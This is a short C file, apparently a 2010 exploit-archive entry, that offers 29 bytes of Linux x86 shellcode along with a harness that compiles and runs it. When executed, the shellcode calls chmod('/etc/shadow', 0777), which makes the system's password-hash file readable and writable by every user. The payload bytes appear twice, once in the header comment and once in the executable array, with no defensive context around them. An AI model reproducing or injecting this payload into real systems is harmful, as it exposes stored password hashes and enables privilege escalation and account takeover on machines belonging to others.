#include <stdio.h>
#include <string.h>

/*
by Magnefikko
20.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 29 bytes chmod("/etc/shadow", 0777) shellcode
Platform: Linux x86

chmod("/etc/shadow", 0777);

gcc -Wl,-z,execstack filename.c

shellcode:

\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\x68\xff\x01\x59\xb0\x0f\xcd\x80

*/


int main(){
char shell[] =
"\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\x68\xff\x01\x59\xb0\x0f\xcd\x80";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}